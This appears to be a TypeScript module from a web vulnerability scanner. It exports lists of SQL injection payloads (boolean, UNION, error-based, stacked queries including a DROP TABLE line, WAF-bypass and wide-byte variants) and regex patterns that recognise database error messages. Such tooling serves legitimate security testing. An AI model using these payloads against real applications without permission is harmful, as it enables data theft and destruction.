// — Boolean-based —
const BOOLEAN_BASED = [
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR 'a'='a",
  "') OR ('1'='1",
  '" OR ""="',
  '" OR 1=1--',
  "1 OR 1=1",
  "1-false",
  "1*56",
  "admin'--",
  "' OR '1'='1'/*",
  "'='",
  "'LIKE'",
  "'=0--+",
  "1' OR '1'='1'--",
];

// — UNION-based —
const UNION_BASED = [
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL--",
  "' UNION ALL SELECT NULL,NULL--",
  "1' UNION SELECT 1,2,3--",
];

// — Error-based extraction —
const ERROR_BASED = [
  "' AND 1=CONVERT(int, @@version)--",
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
  "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
  "' AND GTID_SUBSET(CONCAT(0x7e,VERSION()),1)--",
  "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))--",
  "' AND 1=CAST((SELECT VERSION()) AS int)--",
  "' AND 1=CONVERT(int,DB_NAME())--",
];

// — Stacked queries —
const STACKED_QUERIES = [
  "1; DROP TABLE test--",
  "'; WAITFOR DELAY '0:0:0'--",
  "1; SELECT pg_sleep(0)--",
];

// — Polyglot (work across multiple DB contexts) —
const POLYGLOT = [
  "SLEEP(0)/*' or SLEEP(0) or '\" or SLEEP(0) or \"*/",
  "1 or 1=1",
  "' or ''='",
  '" or ""="',
  "'-'",
  "'^'",
];

// — WAF bypass —
const WAF_BYPASS = [
  "'/**/OR/**/1=1--",
  "'%09OR%091=1--",
  "'%0AOR%0A1=1--",
  "' /*!50000OR*/ 1=1--",
  "' /*!UNION*/ /*!SELECT*/ NULL--",
  "' uNiOn SeLeCt NULL--",
];

// — INSERT context —
const INSERT_CONTEXT = [
  "') ON DUPLICATE KEY UPDATE username='admin'--",
  "','',(SELECT VERSION()))--",
];

// — Wide byte injection (GBK encoding bypass) —
const WIDE_BYTE = ["%bf%27 OR 1=1--", "%A8%27 OR 1=1--"];

export const SQL_PAYLOADS = [
  ...BOOLEAN_BASED,
  ...UNION_BASED,
  ...ERROR_BASED,
  ...STACKED_QUERIES,
  ...POLYGLOT,
  ...WAF_BYPASS,
  ...INSERT_CONTEXT,
  ...WIDE_BYTE,
];

export const SQL_ERROR_PATTERNS: { engine: string; pattern: RegExp }[] = [
  // MySQL
  { engine: "MySQL", pattern: /you have an error in your sql syntax/i },
  { engine: "MySQL", pattern: /warning.*\bmysql_/i },
  { engine: "MySQL", pattern: /mysql_fetch/i },
  { engine: "MySQL", pattern: /MySQLSyntaxErrorException/i },
  { engine: "MySQL", pattern: /SQL syntax.*MySQL/i },
  { engine: "MySQL", pattern: /MySqlClient\./i },
  { engine: "MySQL", pattern: /com\.mysql/i },
  { engine: "MySQL", pattern: /mysql_num_rows/i },
  { engine: "MySQL", pattern: /mysql_result/i },
  { engine: "MySQL", pattern: /MariaDB server version/i },

  // PostgreSQL
  { engine: "PostgreSQL", pattern: /pg_query\(\)/i },
  { engine: "PostgreSQL", pattern: /pg_exec\(\)/i },
  { engine: "PostgreSQL", pattern: /ERROR:\s+syntax error at or near/i },
  { engine: "PostgreSQL", pattern: /unterminated quoted string at or near/i },
  { engine: "PostgreSQL", pattern: /invalid input syntax for/i },
  { engine: "PostgreSQL", pattern: /current transaction is aborted/i },
  { engine: "PostgreSQL", pattern: /PSQLException/i },
  { engine: "PostgreSQL", pattern: /org\.postgresql/i },

  // SQLite
  { engine: "SQLite", pattern: /SQLite3::query/i },
  { engine: "SQLite", pattern: /SQLITE_ERROR/i },
  { engine: "SQLite", pattern: /unrecognized token/i },
  { engine: "SQLite", pattern: /SQLiteException/i },
  { engine: "SQLite", pattern: /near ".*": syntax error/i },
  { engine: "SQLite", pattern: /unable to open database/i },

  // SQL Server
  { engine: "SQL Server", pattern: /org\.hibernate/i },
  { engine: "SQL Server", pattern: /jdbc\.SQLServerException/i },
  { engine: "SQL Server", pattern: /microsoft\.jet\.oledb/i },
  { engine: "SQL Server", pattern: /Unclosed quotation mark after the character string/i },
  { engine: "SQL Server", pattern: /Incorrect syntax near/i },
  { engine: "SQL Server", pattern: /Microsoft SQL Native Client/i },
  { engine: "SQL Server", pattern: /ODBC SQL Server Driver/i },
  { engine: "SQL Server", pattern: /SqlClient\./i },
  { engine: "SQL Server", pattern: /SQL Server.*Driver/i },
  { engine: "SQL Server", pattern: /mssql_query\(\)/i },
  { engine: "SQL Server", pattern: /The multi-part identifier .* could not be bound/i },

  // Oracle
  { engine: "Oracle", pattern: /ORA-\d{5}/i },
  { engine: "Oracle", pattern: /SQL command not properly ended/i },
  { engine: "Oracle", pattern: /PLS-\d{5}/i },
  { engine: "Oracle", pattern: /invalid number/i },

  // MS Access
  { engine: "MS Access", pattern: /Microsoft Access Driver/i },
  { engine: "MS Access", pattern: /JET Database Engine/i },
  { engine: "MS Access", pattern: /Syntax error in query expression/i },

  // Generic / PDO
  { engine: "Generic", pattern: /SQLSTATE\[/i },
  { engine: "Generic", pattern: /unclosed quotation mark/i },
  { engine: "Generic", pattern: /quoted string not properly terminated/i },
  { engine: "Generic", pattern: /SQL syntax.*error/i },
  { engine: "Generic", pattern: /unexpected end of SQL command/i },
  { engine: "Generic", pattern: /invalid query/i },
  { engine: "Generic", pattern: /Data type mismatch/i },
  { engine: "Generic", pattern: /Division by zero/i },
  { engine: "Generic", pattern: /Conversion failed/i },
];
